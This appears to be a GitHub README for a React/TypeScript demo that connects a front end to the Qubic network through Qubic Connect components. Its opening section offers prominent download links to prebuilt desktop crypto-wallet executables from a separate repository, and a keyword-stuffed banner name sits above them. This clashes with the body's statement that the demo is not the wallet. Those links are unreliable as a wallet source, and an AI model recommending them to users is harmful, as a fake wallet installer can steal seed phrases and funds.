![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)

# Qubic Connect demo

A working React reference for connecting an interface to the Qubic network.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> A working reference for putting Qubic inside your own interface: connect, show an account, send a
> transfer. Clone it, run it, take the parts you need.

## A demo that answers the real question

The hard part of adding a network to a front end is never the button. It is everything under the button:
how connection state is held, where the public key comes from, what happens while a transfer is in flight,
and what the user sees when the node is slow. `qubic-connect` is a small, complete interface built to show
those answers in code rather than in prose, using the Qubic Connect components and helpers from the
`qubic-react-ui` package.

It is deliberately a demo, not a framework. The screens are few, the state is readable in one sitting, and
every file has a job you can point at. If you are building a Qubic surface and want to skip the blank-page
stage, start here and delete what you do not need.

## What is in the box

- A connection flow that takes a user from "no wallet" to an identified account.
- An account view that renders the public key and the balances the network returns for it.
- A send form that walks a transfer through its states instead of pretending it is instant.
- A compact layout with the plumbing kept out of the way, so the parts you would replace are obvious.

The stack is ordinary on purpose: TypeScript and React, bundled with Vite, dependencies pinned with pnpm.
Nothing in the demo depends on a private service, and there is no build step you have to guess at.

## Run it locally

```bash
pnpm install
pnpm dev
```

The dev server prints the local address; open it, connect, and the demo walks the same path your users
would. For a production bundle, `pnpm build` writes static files you can host anywhere.

## Who it is for

- Front-end developers adding a Qubic connection to an existing app and wanting a working reference.
- Teams evaluating the Qubic Connect components before committing to them.
- Anyone who learns faster from a running screen than from an API reference.

## What it is not

It is not the wallet. There is no seed handling, no vault and no custody of anything: the demo shows an
account and asks the wallet side to sign, which is the boundary worth keeping when you build your own.
For the desktop wallet itself, its release and its guides, use the links below rather than treating this
demo as a wallet download.

- [What is Qubic Wallet and what does it actually do](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/what-is-qubic-wallet.md) -
  the product, the seed model and the assets, in one page.
- [Qubic Wallet CLI and API surface for developers](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-cli-api-developers.md) -
  what is exposed today and where the interface boundaries sit.

## Contributing

Small, focused pull requests are welcome, especially ones that make a state easier to read. If you change
the connection flow, change the demo's explanation of it in the same commit; the two drifting apart is the
one failure mode this repository is built to avoid.

## At a glance

- Language and stack: TypeScript, React, Vite, pnpm.
- Screens: connection, account, public key, send.
- Data source: the Qubic network, through the Connect components and helpers.
- What you get from it: a working path from "no wallet" to a signed transfer, readable in one sitting.

## Why start from a demo instead of a blank page

Every integration begins with the same three unknowns: what state the connection should hold, where the
account comes from, and how a transfer reports itself while it is in flight. Those are exactly the parts
that are boring to invent and expensive to get wrong, and they are the parts this demo has already
decided. Copy the shape, replace the styling, and spend your time on the thing that is actually yours.

Because the demo is small, you can read all of it before you trust any of it. That property is worth more
than a richer example: a reference you cannot finish reading is a reference you end up believing instead of
checking, and believing code you have not read is how interfaces inherit other people's mistakes.

The demo also shows restraint. It does not hold a seed, does not keep a vault and does not pretend to be the
wallet. That line is the useful lesson: your interface asks, the wallet answers. Keep that boundary and an
integration stays small; blur it and you have built a second wallet by accident, with none of the review.

If your interface needs more than a connection, the guides below cover the wallet side in language a front
end developer can use directly.

## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
